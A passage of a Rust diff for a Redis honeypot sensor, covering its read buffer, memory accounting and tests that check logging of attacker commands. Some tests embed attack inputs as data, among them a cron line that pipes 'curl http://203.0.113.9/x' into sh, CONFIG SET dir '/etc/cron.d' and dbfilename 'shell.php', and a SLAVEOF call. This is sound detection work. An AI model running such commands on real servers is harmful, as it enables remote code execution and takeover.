+    /// took, so a session holds pool room only while a large command is being read.
+    fn release_dispatched(&mut self) {
+        self.buf.drain(..std::mem::take(&mut self.dispatched));
+        if self.buf.capacity() > memory::BUFFER_FLOOR {
+            self.buf.shrink_to(memory::BUFFER_FLOOR);
+            // A smaller capacity: refunds, never refused.
+            self.memory.set(self.buf.capacity());
+        }
+    }
+
+    /// Make room for `extra` more bytes, charging the new capacity past the floor; false when
+    /// the pool cannot cover even one step past what is needed.
+    fn reserve(&mut self, extra: usize) -> bool {
+        let need = self.buf.len() + extra;
+        let capacity = self.buf.capacity();
+        if need <= capacity {
+            return true;
+        }
+        // Doubling keeps the copying a growing command costs linear in its size; when the pool
+        // cannot cover that, growing a step at a time still does.
+        let doubled = need.max(capacity * 2).max(READ_CHUNK_SIZE);
+        let stepped = need.next_multiple_of(BUFFER_STEP);
+        let Some(target) = [doubled, stepped]
+            .into_iter()
+            .find(|&target| self.memory.set(target))
+        else {
+            return false;
+        };
+        // Exact, so the capacity is the charged size, not whatever `Vec` would round up to.
+        self.buf.reserve_exact(target - self.buf.len());
+        true
+    }
+
+    async fn read_command<S: AsyncRead + Unpin>(&mut self, stream: &mut S) -> ReadOutcome {
+        self.release_dispatched();
+        loop {
+            match self.parser.parse(&self.buf) {
+                Ok(resp::ParseOutcome::Complete { args, consumed }) => {
+                    if args.is_empty() {
+                        // A blank inline line or a zero-count array: not a command.
+                        self.buf.drain(..consumed);
+                        continue;
+                    }
+                    self.dispatched = consumed;
+                    return ReadOutcome::Command(args);
+                }
+                Ok(resp::ParseOutcome::Incomplete) => {}
+                Err(resp::RespError::Protocol(_)) => return ReadOutcome::ProtocolError,
+            }
+
+            if self.total_captured >= self.bounds.max_captured_bytes {
+                return ReadOutcome::Closed;
+            }
+
+            let per_read_timeout = if self.first_read {
+                self.bounds.read_timeout
+            } else {
+                self.bounds.idle_timeout
+            };
+
+            let mut chunk = [0u8; READ_CHUNK_SIZE];
+            let n = match tokio::time::timeout(per_read_timeout, stream.read(&mut chunk)).await {
+                Ok(Ok(0)) | Ok(Err(_)) | Err(_) => return ReadOutcome::Closed,
+                Ok(Ok(n)) => n,
+            };
+            self.first_read = false;
+            self.total_captured += n as u64;
+            if !self.reserve(n) {
+                // The pool cannot hold this command: end the session, as a real Redis closes a
+                // client whose query buffer passes its limit.
+                return ReadOutcome::Closed;
+            }
+            self.buf.extend_from_slice(&chunk[..n]);
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn ip(s: &str) -> IpAddr {
+        s.parse().unwrap()
+    }
+
+    fn args(strs: &[&str]) -> Vec<Vec<u8>> {
+        strs.iter().map(|s| s.as_bytes().to_vec()).collect()
+    }
+
+    /// A session whose store draws on a pool that never runs out.
+    fn new_session() -> Session {
+        Session::new(
+            ip("203.0.113.7"),
+            None,
+            Uuid::now_v7(),
+            &CaptureMemoryBudget::new(u64::MAX),
+        )
+    }
+
+    fn metadata_object(event: &SensorEvent) -> &serde_json::Map<String, serde_json::Value> {
+        event
+            .metadata
+            .as_object()
+            .expect("metadata must be an object")
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // connection_event
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn connection_event_is_unauthenticated_with_redis_label() {
+        let event = connection_event(ip("203.0.113.7"), None, Uuid::now_v7(), false);
+        assert!(!event.authenticated);
+        assert_eq!(event.sensor, "redis");
+        assert_eq!(event.signal_type, SIGNAL_HONEYPOT_CONNECTION);
+        assert_eq!(event.protocol, PROTO_TCP);
+        assert_eq!(event.v, WIRE_VERSION);
+        assert_eq!(event.sample, None);
+        assert_eq!(
+            event
+                .metadata
+                .get("protocol_label")
+                .and_then(|v| v.as_str()),
+            Some("redis")
+        );
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - PING
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn ping_replies_pong_with_no_events() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["PING"]));
+        assert_eq!(response, resp::simple_string("PONG"));
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn command_dispatch_is_case_insensitive() {
+        let mut session = new_session();
+        let (response, _events) = session.dispatch(&args(&["ping"]));
+        assert_eq!(response, resp::simple_string("PONG"));
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - AUTH
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn auth_replies_ok_and_sets_authenticated() {
+        let mut session = new_session();
+        assert!(!session.is_authenticated());
+        let (response, events) = session.dispatch(&args(&["AUTH", "hunter2"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert!(session.is_authenticated());
+        assert_eq!(events.len(), 1);
+        assert_eq!(events[0].signal_type, SIGNAL_HONEYPOT_LOGIN_ATTEMPT);
+        assert!(events[0].authenticated);
+        assert_eq!(events[0].sensor, "redis");
+    }
+
+    #[test]
+    fn auth_password_never_appears_in_event_metadata() {
+        let mut session = new_session();
+        let (_response, events) = session.dispatch(&args(&["AUTH", "SuperSecretPassword123"]));
+        let event_json = serde_json::to_string(&events[0]).unwrap();
+        assert!(!event_json.contains("SuperSecretPassword123"));
+        // Stronger than a substring check: no key in metadata even names a credential field, so a
+        // future field addition to `SensorEvent` cannot silently reintroduce a captured value.
+        let obj = metadata_object(&events[0]);
+        assert!(!obj.contains_key("password"));
+        assert!(!obj.contains_key("credential"));
+    }
+
+    #[test]
+    fn auth_missing_password_argument_is_error_and_no_event() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["AUTH"]));
+        assert!(response.starts_with(b"-"), "expected an error reply");
+        assert!(events.is_empty());
+        assert!(!session.is_authenticated());
+    }
+
+    #[test]
+    fn auth_accepts_acl_style_username_and_password() {
+        // Redis 6+'s `AUTH <username> <password>` form - both dropped identically to the
+        // single-password form.
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["AUTH", "default", "hunter2"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert_eq!(events.len(), 1);
+        let obj = metadata_object(&events[0]);
+        assert!(!obj.contains_key("password"));
+        assert!(!obj.contains_key("username"));
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - INFO / CONFIG GET
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn info_returns_canned_bulk_string_with_no_events() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["INFO"]));
+        assert!(response.starts_with(b"$"), "INFO must reply a bulk string");
+        let text = String::from_utf8_lossy(&response);
+        assert!(text.contains("redis_version"));
+        assert!(text.contains("Linux"));
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn config_get_returns_array_with_no_events() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["CONFIG", "GET", "*"]));
+        assert!(response.starts_with(b"*"), "CONFIG GET must reply an array");
+        assert!(events.is_empty());
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - SET / GET
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn set_replies_ok_and_emits_command_exec_with_key_and_value() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["SET", "foo", "bar"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert_eq!(events.len(), 1);
+        let event = &events[0];
+        assert_eq!(event.signal_type, SIGNAL_HONEYPOT_COMMAND_EXEC);
+        assert_eq!(
+            event.metadata.get("command").and_then(|v| v.as_str()),
+            Some("SET")
+        );
+        assert_eq!(
+            event.metadata.get("key").and_then(|v| v.as_str()),
+            Some("foo")
+        );
+        assert_eq!(
+            event.metadata.get("value").and_then(|v| v.as_str()),
+            Some("bar")
+        );
+    }
+
+    #[test]
+    fn set_command_exec_authenticated_field_reflects_session_state() {
+        let mut session = new_session();
+        let (_r, events) = session.dispatch(&args(&["SET", "foo", "bar"]));
+        assert!(
+            !events[0].authenticated,
+            "SET before AUTH must be authenticated=false"
+        );
+
+        session.dispatch(&args(&["AUTH", "pw"]));
+        let (_r, events) = session.dispatch(&args(&["SET", "foo", "bar"]));
+        assert!(
+            events[0].authenticated,
+            "SET after AUTH must be authenticated=true"
+        );
+    }
+
+    #[test]
+    fn set_wrong_arity_is_error_and_no_event() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["SET", "onlykey"]));
+        assert!(response.starts_with(b"-"));
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn set_value_containing_crlf_is_sanitized_in_metadata() {
+        let mut session = new_session();
+        let (_response, events) = session.dispatch(&args(&[
+            "SET",
+            "key",
+            "evil\r\n{\"signal_type\":\"forged\"}",
+        ]));
+        let value = events[0]
+            .metadata
+            .get("value")
+            .and_then(|v| v.as_str())
+            .unwrap();
+        assert!(!value.contains('\r'));
+        assert!(!value.contains('\n'));
+    }
+
+    #[test]
+    fn get_of_a_key_never_set_is_nil_and_emits_nothing() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["GET", "foo"]));
+        assert_eq!(response, resp::nil_bulk_string());
+        assert!(
+            events.is_empty(),
+            "GET must never emit an event per the design spec"
+        );
+    }
+
+    /// `SET foo bar` then `GET foo` is the ordinary write-then-read check; answering `+OK` and
+    /// then nil two commands later contradicted the server within one session.
+    #[test]
+    fn get_after_set_returns_the_value_within_the_session() {
+        let mut session = new_session();
+        session.dispatch(&args(&["SET", "foo", "bar"]));
+        let (response, _events) = session.dispatch(&args(&["GET", "foo"]));
+        assert_eq!(response, resp::bulk_string("bar"));
+        // Overwrite is visible too.
+        session.dispatch(&args(&["SET", "foo", "baz"]));
+        assert_eq!(
+            session.dispatch(&args(&["GET", "foo"])).0,
+            resp::bulk_string("baz")
+        );
+        // Nothing persists across connections: a new session starts empty.
+        let mut fresh = new_session();
+        assert_eq!(
+            fresh.dispatch(&args(&["GET", "foo"])).0,
+            resp::nil_bulk_string()
+        );
+    }
+
+    /// A write the store cannot hold is refused with Redis's own out-of-memory error, never
+    /// acknowledged and then dropped or cut: the reply and a later GET must agree.
+    #[test]
+    fn a_set_past_the_key_cap_is_refused_not_silently_dropped() {
+        let mut session = new_session();
+        for i in 0..MAX_KEYS {
+            let key = format!("k{i}");
+            assert_eq!(
+                session.dispatch(&args(&["SET", &key, "v"])).0,
+                resp::simple_string("OK")
+            );
+        }
+        let (reply, events) = session.dispatch(&args(&["SET", "one-too-many", "v"]));
+        assert_eq!(reply, resp::error_reply(OOM_REPLY));
+        assert_eq!(events.len(), 1, "the attempt is still recorded");
+        assert_eq!(
+            session.dispatch(&args(&["GET", "one-too-many"])).0,
+            resp::nil_bulk_string()
+        );
+        // A key already held can still be overwritten at the cap.
+        assert_eq!(
+            session.dispatch(&args(&["SET", "k0", "new"])).0,
+            resp::simple_string("OK")
+        );
+        assert_eq!(
+            session.dispatch(&args(&["GET", "k0"])).0,
+            resp::bulk_string("new")
+        );
+    }
+
+    /// The ledger field of a long argument matches the whole-argument result for ordinary input,
+    /// and a huge invalid-UTF-8 argument decodes only a bounded prefix.
+    #[test]
+    fn a_ledger_field_decodes_only_a_prefix_of_a_long_argument() {
+        let ascii = vec![b'a'; 512 * 1024];
+        assert_eq!(
+            ledger(&ascii, MAX_VALUE_LEN),
+            sanitize_value(&text(&ascii), MAX_VALUE_LEN)
+        );
+        let mixed = "h\u{e9}llo w\u{f6}rld ".repeat(40_000).into_bytes();
+        assert_eq!(
+            ledger(&mixed, MAX_VALUE_LEN),
+            sanitize_value(&text(&mixed), MAX_VALUE_LEN)
+        );
+        let binary = vec![0xFFu8; 512 * 1024];
+        let kept = ledger(&binary, MAX_VALUE_LEN);
+        assert!(kept.len() <= MAX_VALUE_LEN);
+        assert!(!kept.is_empty());
+    }
+
+    /// Padding that sanitization removes ahead of the payload must not hide it: the kept prefix
+    /// is `max_len` bytes after sanitizing, wherever in the argument they come from.
+    #[test]
+    fn a_payload_behind_removable_padding_is_still_recorded() {
+        let payload = "*/1 * * * * curl http://203.0.113.9/x | sh";
+        // Each of these leaves at most one space however long it is.
+        let paddings: [&[u8]; 4] = [
+            b"\r\n\t",
+            b"\x00",
+            "\u{200b}".as_bytes(),
+            b"\x1b[2K\x00\xe2\x80\x8b\xe2\x80\xae",
+        ];
+        for pad in paddings {
+            for reps in [1usize, 1024, 4000, 20_000, 60_000] {
+                let mut arg = pad.repeat(reps);
+                arg.extend_from_slice(payload.as_bytes());
+                let kept = ledger(&arg, MAX_VALUE_LEN);
+                assert!(
+                    kept.contains(payload),
+                    "padding {pad:?} x {reps} hid the payload: {kept:?}"
+                );
+                assert_eq!(kept, sanitize_value(&text(&arg), MAX_VALUE_LEN));
+            }
+        }
+    }
+
+    /// The chunked ledger equals sanitizing the whole argument, over generated arguments that mix
+    /// ASCII, line breaks, controls, zero-width and multi-byte characters, invalid bytes and CSI
+    /// escapes in runs long enough to cross many chunk boundaries.
+    #[test]
+    fn the_chunked_ledger_equals_sanitizing_the_whole_argument() {
+        let atoms: [&[u8]; 12] = [
+            b"abc",
+            b" ",
+            b"\r\n",
+            b"\t",
+            b"\x00",
+            "\u{200b}".as_bytes(),
+            "\u{e9}".as_bytes(),
+            "\u{1f600}".as_bytes(),
+            b"\xff",
+            b"\x1b[31m",
+            b"\x1b[",
+            b"\x1b",
+        ];
+        let mut seed = 0x2545_f491_4f6c_dd1du64;
+        let mut next = move || {
+            seed ^= seed << 13;
+            seed ^= seed >> 7;
+            seed ^= seed << 17;
+            seed
+        };
+        for case in 0..300 {
+            let mut arg = Vec::new();
+            let target = 1 + (next() % 40_000) as usize;
+            while arg.len() < target {
+                let atom = atoms[(next() % atoms.len() as u64) as usize];
+                let run = if next() % 4 == 0 {
+                    1 + next() % 3000
+                } else {
+                    1
+                };
+                for _ in 0..run {
+                    arg.extend_from_slice(atom);
+                }
+            }
+            for max_len in [128, MAX_VALUE_LEN] {
+                assert_eq!(
+                    ledger(&arg, max_len),
+                    sanitize_value(&text(&arg), max_len),
+                    "case {case}, max_len {max_len}, {} bytes",
+                    arg.len()
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn info_and_config_get_report_the_same_nonzero_maxmemory() {
+        assert!(canned_info().contains("maxmemory:268435456\r\n"));
+        let mut session = new_session();
+        let reply = session.dispatch(&args(&["CONFIG", "GET", "maxmemory"])).0;
+        assert!(String::from_utf8_lossy(&reply).contains("268435456"));
+    }
+
+    #[test]
+    fn a_value_is_stored_whole_and_a_write_past_the_byte_budget_is_refused() {
+        let mut session = new_session();
+        let big = "x".repeat(1025);
+        assert_eq!(
+            session.dispatch(&args(&["SET", "big", &big])).0,
+            resp::simple_string("OK")
+        );
+        assert_eq!(
+            session.dispatch(&args(&["GET", "big"])).0,
+            resp::bulk_string(&big),
+            "GET returns all 1025 bytes, not a cut copy"
+        );
+        let huge = "y".repeat(MAX_STORE_BYTES);
+        assert_eq!(
+            session.dispatch(&args(&["SET", "huge", &huge])).0,
+            resp::error_reply(OOM_REPLY)
+        );
+        assert_eq!(
+            session.dispatch(&args(&["GET", "huge"])).0,
+            resp::nil_bulk_string()
+        );
+        // The refused write did not disturb what was already held.
+        assert_eq!(
+            session.dispatch(&args(&["GET", "big"])).0,
+            resp::bulk_string(&big)
+        );
+    }
+
+    /// Past its floor the store draws on the pool every session shares. A write the pool cannot
+    /// hold is refused like any other the store cannot hold, a write within the floor still
+    /// succeeds when the pool is full, and a session that ends gives back what it drew.
+    #[test]
+    fn a_set_the_shared_pool_cannot_hold_is_refused_and_an_ended_session_gives_it_back() {
+        let pool = CaptureMemoryBudget::new(100_000);
+        let session = |pool: &CaptureMemoryBudget| {
+            Session::new(ip("203.0.113.7"), None, Uuid::now_v7(), pool)
+        };
+        let big = "x".repeat(80_000);
+        let mut first = session(&pool);
+        assert_eq!(
+            first.dispatch(&args(&["SET", "a", &big])).0,
+            resp::simple_string("OK")
+        );
+        let drawn = 1 + 80_000 + memory::ENTRY_OVERHEAD - memory::STORE_FLOOR;
+        assert_eq!(pool.current_bytes(), drawn as u64);
+
+        let mut second = session(&pool);
+        let (reply, events) = second.dispatch(&args(&["SET", "a", &big]));
+        assert_eq!(reply, resp::error_reply(OOM_REPLY));
+        assert_eq!(events.len(), 1, "the attempt is still recorded");
+        assert_eq!(
+            second.dispatch(&args(&["GET", "a"])).0,
+            resp::nil_bulk_string()
+        );
+        assert_eq!(
+            second.dispatch(&args(&["SET", "small", "v"])).0,
+            resp::simple_string("OK"),
+            "a write within the floor needs nothing from the pool"
+        );
+        assert_eq!(pool.current_bytes(), drawn as u64);
+
+        // Overwriting with a smaller value gives the difference back.
+        first.dispatch(&args(&["SET", "a", "y"]));
+        assert_eq!(pool.current_bytes(), 0);
+        first.dispatch(&args(&["SET", "a", &big]));
+        drop(first);
+        assert_eq!(pool.current_bytes(), 0);
+        assert_eq!(
+            second.dispatch(&args(&["SET", "a", &big])).0,
+            resp::simple_string("OK")
+        );
+        drop(second);
+        assert_eq!(pool.current_bytes(), 0);
+    }
+
+    fn set_command(value_len: usize) -> Vec<u8> {
+        let mut out = format!("*3\r\n$3\r\nSET\r\n$1\r\nk\r\n${value_len}\r\n").into_bytes();
+        out.resize(out.len() + value_len, b'v');
+        out.extend_from_slice(b"\r\n");
+        out
+    }
+
+    fn reader_bounds() -> ConnectionBounds {
+        ConnectionBounds {
+            read_timeout: std::time::Duration::from_secs(5),
+            idle_timeout: std::time::Duration::from_secs(5),
+            max_duration: std::time::Duration::from_secs(30),
+            max_captured_bytes: 1_000_000,
+            max_concurrent: 4,
+        }
+    }
+
+    /// The read buffer's real capacity past the floor is what the pool is charged while a large
+    /// command is read, and reading the next command gives that room back.
+    #[tokio::test]
+    async fn the_read_buffer_is_charged_its_capacity_and_gives_it_back_after_the_command() {
+        let pool = CaptureMemoryBudget::new(u64::MAX);
+        let (mut client, mut server) = tokio::io::duplex(64 * 1024);
+        let mut reader = RespReader::new(reader_bounds(), &pool);
+        let command = set_command(200_000);
+        let writer = tokio::spawn(async move {
+            client.write_all(&command).await.unwrap();
+            client.write_all(b"PING\r\n").await.unwrap();
+            client
+        });
+        let ReadOutcome::Command(ranges) = reader.read_command(&mut server).await else {
+            panic!("expected the SET");
+        };
+        assert_eq!(reader.args(&ranges)[2].len(), 200_000);
+        let capacity = reader.buf.capacity();
+        assert!(capacity >= 200_000);
+        assert_eq!(
+            pool.current_bytes(),
+            (capacity - memory::BUFFER_FLOOR) as u64,
+            "the charge is the capacity past the floor"
+        );
+        assert!(matches!(
+            reader.read_command(&mut server).await,
+            ReadOutcome::Command(_)
+        ));
+        assert!(reader.buf.capacity() <= memory::BUFFER_FLOOR);
+        assert_eq!(pool.current_bytes(), 0);
+        let _client = writer.await.unwrap();
+    }
+
+    /// A peer that never reads its replies cannot hold the session in the write past the limit.
+    #[tokio::test]
+    async fn a_reply_the_peer_never_reads_ends_the_write() {
+        let (_client, mut server) = tokio::io::duplex(1024);
+        let started = std::time::Instant::now();
+        let ok = write_reply(
+            &mut server,
+            &vec![b'x'; 64 * 1024],
+            std::time::Duration::from_millis(100),
+        )
+        .await;
+        assert!(!ok);
+        assert!(started.elapsed() < std::time::Duration::from_secs(5));
+        let (mut client, mut server) = tokio::io::duplex(1024);
+        assert!(write_reply(&mut server, b"+OK\r\n", std::time::Duration::from_secs(5)).await);
+        let mut got = [0u8; 5];
+        tokio::io::AsyncReadExt::read_exact(&mut client, &mut got)
+            .await
+            .unwrap();
+        assert_eq!(&got, b"+OK\r\n");
+    }
+
+    /// A command the pool cannot buffer ends the session; what the buffer drew is given back.
+    #[tokio::test]
+    async fn a_command_the_pool_cannot_buffer_ends_the_session() {
+        let pool = CaptureMemoryBudget::new(100_000);
+        let (mut client, mut server) = tokio::io::duplex(64 * 1024);
+        let mut reader = RespReader::new(reader_bounds(), &pool);
+        let command = set_command(300_000);
+        let writer = tokio::spawn(async move {
+            // The reader stops reading part way, so the rest of the write may fail.
+            let _ = client.write_all(&command).await;
+        });
+        assert!(matches!(
+            reader.read_command(&mut server).await,
+            ReadOutcome::Closed
+        ));
+        assert!(pool.current_bytes() <= 100_000);
+        drop(reader);
+        assert_eq!(pool.current_bytes(), 0);
+        drop(server);
+        writer.await.unwrap();
+    }
+
+    /// Redis strings are binary-safe. A value that is not UTF-8 reads back byte for byte, and
+    /// two keys that differ only in a non-UTF-8 byte are two keys; decoding arguments as text
+    /// used to return U+FFFD for the value and make the keys collide.
+    #[test]
+    fn non_utf8_values_and_keys_are_kept_as_bytes() {
+        let mut session = new_session();
+        let set = |k: &[u8], v: &[u8]| vec![b"SET".to_vec(), k.to_vec(), v.to_vec()];
+        let get = |k: &[u8]| vec![b"GET".to_vec(), k.to_vec()];
+        let (reply, events) = session.dispatch(&set(b"bin", &[0xFF]));
+        assert_eq!(reply, resp::simple_string("OK"));
+        assert_eq!(
+            events[0].metadata.get("value").and_then(|v| v.as_str()),
+            Some("\u{FFFD}"),
+            "the ledger copy is text"
+        );
+        assert_eq!(session.dispatch(&get(b"bin")).0, resp::bulk_bytes(&[0xFF]));
+        session.dispatch(&set(&[0xFF], b"one"));
+        session.dispatch(&set(&[0xFE], b"two"));
+        assert_eq!(session.dispatch(&get(&[0xFF])).0, resp::bulk_string("one"));
+        assert_eq!(session.dispatch(&get(&[0xFE])).0, resp::bulk_string("two"));
+    }
+
+    #[test]
+    fn get_wrong_arity_is_error() {
+        let mut session = new_session();
+        let (response, _events) = session.dispatch(&args(&["GET"]));
+        assert!(response.starts_with(b"-"));
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - CONFIG SET dir/dbfilename (filesystem-write indicator)
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn config_set_dir_is_logged_as_indicator() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["CONFIG", "SET", "dir", "/etc/cron.d"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert_eq!(events.len(), 1);
+        let event = &events[0];
+        assert_eq!(event.signal_type, SIGNAL_HONEYPOT_COMMAND_EXEC);
+        assert_eq!(
+            event.metadata.get("command").and_then(|v| v.as_str()),
+            Some("CONFIG SET")
+        );
+        assert_eq!(
+            event.metadata.get("param").and_then(|v| v.as_str()),
+            Some("dir")
+        );
+        assert_eq!(
+            event.metadata.get("value").and_then(|v| v.as_str()),
+            Some("/etc/cron.d")
+        );
+    }
+
+    #[test]
+    fn config_set_dbfilename_is_logged_as_indicator() {
+        let mut session = new_session();
+        let (_response, events) =
+            session.dispatch(&args(&["CONFIG", "SET", "dbfilename", "shell.php"]));
+        assert_eq!(events.len(), 1);
+        assert_eq!(
+            events[0].metadata.get("param").and_then(|v| v.as_str()),
+            Some("dbfilename")
+        );
+    }
+
+    #[test]
+    fn config_set_dir_param_match_is_case_insensitive() {
+        let mut session = new_session();
+        let (_response, events) = session.dispatch(&args(&["CONFIG", "SET", "DIR", "/tmp/x"]));
+        assert_eq!(
+            events.len(),
+            1,
+            "CONFIG SET DIR (uppercase) must still be logged"
+        );
+    }
+
+    #[test]
+    fn config_set_other_param_replies_ok_without_event() {
+        // Only dir/dbfilename are named as filesystem-write indicators by the design spec; a
+        // benign CONFIG SET must still succeed (this sensor never really persists config either
+        // way) but must not manufacture an indicator event for it.
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["CONFIG", "SET", "maxmemory", "100mb"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn config_unknown_subcommand_is_error() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["CONFIG", "RESETSTAT"]));
+        assert!(response.starts_with(b"-"));
+        assert!(events.is_empty());
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - SLAVEOF / REPLICAOF
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn slaveof_is_logged_as_indicator() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["SLAVEOF", "198.51.100.50", "6379"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert_eq!(events.len(), 1);
+        let event = &events[0];
+        assert_eq!(event.signal_type, SIGNAL_HONEYPOT_COMMAND_EXEC);
+        assert_eq!(
+            event.metadata.get("command").and_then(|v| v.as_str()),
+            Some("SLAVEOF")
+        );
+        let recorded_args: Vec<&str> = event.metadata["args"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|v| v.as_str().unwrap())
+            .collect();
+        assert_eq!(recorded_args, vec!["198.51.100.50", "6379"]);
+    }
+
+    #[test]
+    fn replicaof_no_one_is_logged_with_command_name_preserved() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["REPLICAOF", "NO", "ONE"]));
+        assert_eq!(response, resp::simple_string("OK"));
+        assert_eq!(
+            events[0].metadata.get("command").and_then(|v| v.as_str()),
+            Some("REPLICAOF")
+        );
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - EVAL / SCRIPT
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn eval_replies_error_and_emits_command_exec() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&[
+            "EVAL",
+            "return redis.call('set', KEYS[1], ARGV[1])",
+            "1",
+            "k",
+            "v",
+        ]));
+        assert!(response.starts_with(b"-"), "EVAL must reply an error");
+        assert_eq!(events.len(), 1);
+        assert_eq!(
+            events[0].metadata.get("command").and_then(|v| v.as_str()),
+            Some("EVAL")
+        );
+    }
+
+    #[test]
+    fn script_replies_error_and_emits_command_exec() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["SCRIPT", "LOAD", "return 1"]));
+        assert!(response.starts_with(b"-"));
+        assert_eq!(events.len(), 1);
+        assert_eq!(
+            events[0].metadata.get("command").and_then(|v| v.as_str()),
+            Some("SCRIPT")
+        );
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // Session::dispatch - unknown commands
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn unknown_command_replies_error_with_no_events() {
+        let mut session = new_session();
+        let (response, events) = session.dispatch(&args(&["FOOBARBAZ"]));
+        assert!(response.starts_with(b"-ERR"));
+        let text = String::from_utf8_lossy(&response);
+        assert!(text.to_uppercase().contains("UNKNOWN COMMAND"));
+        assert!(events.is_empty());
+    }
+
+    // ---------------------------------------------------------------------------------------
+    // protocol_label on every event kind this module can emit
+    // ---------------------------------------------------------------------------------------
+
+    #[test]
+    fn every_emitted_event_carries_redis_protocol_label_and_sensor() {
+        let mut session = new_session();
+        let mut all_events = vec![connection_event(
+            ip("203.0.113.7"),
+            None,
+            Uuid::now_v7(),
+            false,
+        )];
+        all_events.extend(session.dispatch(&args(&["AUTH", "pw"])).1);
+        all_events.extend(session.dispatch(&args(&["SET", "k", "v"])).1);
+        all_events.extend(session.dispatch(&args(&["CONFIG", "SET", "dir", "/tmp"])).1);
+        all_events.extend(
+            session
+                .dispatch(&args(&["SLAVEOF", "198.51.100.50", "6379"]))
+                .1,
+        );
+        all_events.extend(session.dispatch(&args(&["EVAL", "return 1", "0"])).1);
+
+        assert!(!all_events.is_empty());
+        for event in &all_events {
+            assert_eq!(event.sensor, "redis");
+            assert_eq!(event.protocol, PROTO_TCP);
+            assert_eq!(
+                event
+                    .metadata
+                    .get("protocol_label")
+                    .and_then(|v| v.as_str()),
+                Some("redis")
+            );
+        }
+    }
+
+    /// Drive one command of every event-emitting kind through `session` and collect the events.
+    fn every_kind_of_event(mut session: Session) -> Vec<SensorEvent> {
+        let mut events = Vec::new();
+        for cmd in [
+            args(&["AUTH", "pw"]),
+            args(&["SET", "k", "v"]),
+            args(&["CONFIG", "SET", "dir", "/tmp"]),
+            args(&["SLAVEOF", "198.51.100.50", "6379"]),
+            args(&["EVAL", "return 1", "0"]),
+        ] {
+            events.extend(session.dispatch(&cmd).1);
+        }
+        events
+    }
+
+    #[test]
+    fn connection_event_marks_tls_only_when_tls() {
+        let plain = connection_event(ip("203.0.113.7"), None, Uuid::now_v7(), false);
+        assert!(plain.metadata.get("tls").is_none());
+        let tls = connection_event(ip("203.0.113.7"), None, Uuid::now_v7(), true);
+        assert_eq!(
+            tls.metadata.get("tls").and_then(|v| v.as_bool()),
+            Some(true)
+        );
+        assert_eq!(
+            tls.metadata.get("protocol_label").and_then(|v| v.as_str()),
+            Some("redis")
+        );
+    }
+
+    #[test]
+    fn tls_session_tags_every_event_it_emits() {
+        let session = new_session().with_tls(true);
+        let events = every_kind_of_event(session);
+        assert_eq!(events.len(), 5, "AUTH, SET, CONFIG SET, SLAVEOF, EVAL");
+        for event in &events {
+            assert_eq!(
+                event.metadata.get("tls").and_then(|v| v.as_bool()),
+                Some(true),
+                "{:?}",
+                event.metadata
+            );
+        }
+    }
+
+    #[test]
+    fn plain_session_events_have_no_tls_key() {
+        let session = new_session();
+        let events = every_kind_of_event(session);
+        assert_eq!(events.len(), 5);
+        for event in &events {
+            assert!(event.metadata.get("tls").is_none(), "{:?}", event.metadata);
+        }
+    }
+
+    #[test]
+    fn ping_echoes_its_argument() {
+        let mut s = new_session();
+        assert_eq!(
+            s.dispatch(&args(&["PING"])).0,
+            crate::resp::simple_string("PONG")
+        );
+        assert_eq!(
+            s.dispatch(&args(&["PING", "hello"])).0,
+            crate::resp::bulk_string("hello")
+        );
+    }
+
+    #[test]
+    fn unknown_command_error_keeps_case_and_lists_args() {
+        // The old reply uppercased the command and dropped the args clause - both one-probe tells.
+        let msg = unknown_command_error(&[b"FooBar", b"alpha", b"beta"]);
+        assert!(msg.contains("unknown command 'FooBar'"), "{msg}");
+        assert!(
+            msg.contains("with args beginning with: 'alpha', 'beta', "),
+            "{msg}"
+        );
+    }
+
+    #[test]
+    fn info_is_live_not_a_frozen_stub() {
+        let mut s = new_session();
+        let (reply, _) = s.dispatch(&args(&["INFO"]));
